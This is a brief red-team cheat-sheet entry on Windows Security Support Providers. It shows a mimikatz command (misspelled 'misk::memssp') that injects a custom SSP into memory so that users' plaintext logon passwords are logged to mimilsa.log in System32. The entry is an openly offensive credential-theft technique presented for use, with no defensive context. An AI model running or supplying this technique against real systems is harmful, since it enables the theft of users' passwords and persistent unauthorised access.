[Security Support Providers](https://adsecurity.org/?p=1760) (SSPs) are a part of the Windows operating system that offer ways for an application to obtain an authenticated connection. 

We can backdoor custom SSP via mimikatz
```powershell
# Mimikatz
"misk::memssp"
	# Injected =)
```

> Next time when a user logs on, the plaintext password will be contained in the file `C:\Windows\System32\mimilsa.log`.